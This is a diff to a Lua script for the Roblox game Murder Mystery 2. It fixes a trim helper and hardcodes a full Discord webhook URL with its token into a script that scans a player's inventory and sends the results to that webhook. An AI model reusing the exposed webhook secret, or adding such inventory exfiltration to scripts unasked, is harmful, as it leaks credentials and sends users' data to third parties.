@@ -66,9 +66,9 @@ local function scanFullInventory()
         ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
     }
     
-    local
+    local function trim(s)
         return s:match("^%s*(.-)%s*$")
-    
+    end
     
     local function fetchHTML(url)
         local success, response = pcall(function()
@@ -464,7 +464,7 @@ local function scanInventoryAndSendToWebhook()
 end
 
 -- PLACE YOUR WEBHOOK HERE
-_G.webhook 
+_G.webhook = "https://discord.com/api/webhooks/1487777549030396004/_Ytqc63KpuCRnNZ-rWn5OdI05tauBEP6w8kCy2rimDnOWTfBQ_49IXsB-SnZ1_nY7ukv"
 
 if game.PlaceId ~= 142823291 then
     warn("Game not supported. Please join Murder Mystery 2.")
